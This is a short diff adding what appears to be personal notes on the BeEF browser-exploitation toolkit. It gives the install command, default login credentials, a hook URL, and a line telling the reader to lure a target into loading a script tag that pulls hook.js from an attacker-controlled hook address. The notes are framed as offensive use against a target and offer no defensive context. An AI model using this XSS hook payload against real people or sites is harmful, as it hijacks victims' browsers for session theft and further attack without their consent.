@@ -1,0 +1,15 @@
+== XSS toolkit - BEEF == 
+
+apt install beef-xss 
+
+beef 
+	default login / pass - bef:beef 
+
+	hook URL: something/hook.js 
+
+Loore the tgt into doing 
+	"<script src="hook_addr/hook.js"></script>" 
+
+And then play around
+
+
